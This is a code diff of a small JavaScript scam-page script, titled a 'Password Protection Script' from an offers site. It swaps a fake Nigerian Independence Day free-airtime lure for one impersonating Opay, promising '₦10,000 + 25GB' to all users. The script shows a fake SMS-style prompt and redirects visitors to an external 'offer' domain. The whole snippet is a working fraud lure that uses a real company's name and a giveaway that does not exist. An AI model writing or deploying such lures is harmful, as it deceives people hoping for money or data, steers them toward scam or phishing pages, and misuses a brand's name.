@@ -1,7 +1,7 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
-var password = '20GB Free Data'
-password=prompt('SMS: Congratulations You are Eligible to receive GH₵20 Airtime and 20GB Free Data From NIGERIA INDEPENDENCE Offer, Kindly Press OK to ACTIVATE ','20GB Free Data');
-if (password != '20GB Free Data') {
-location.href='http://independence.alloffer.org/20GB';
+var password = '₦10,000 + 25GB'
+password=prompt('SMS: Welcome to Opay ₦10,000 + 25GB NIGERIA 66th INDEPENDENCE DAY Offer To All Opay Users, Kindly Press OK to PROCEED ','₦10,000 + 25GB');
+if (password != '₦10,000 + 25GB') {
+location.href='https://independence.data-offer.live/20GB';
 
 }
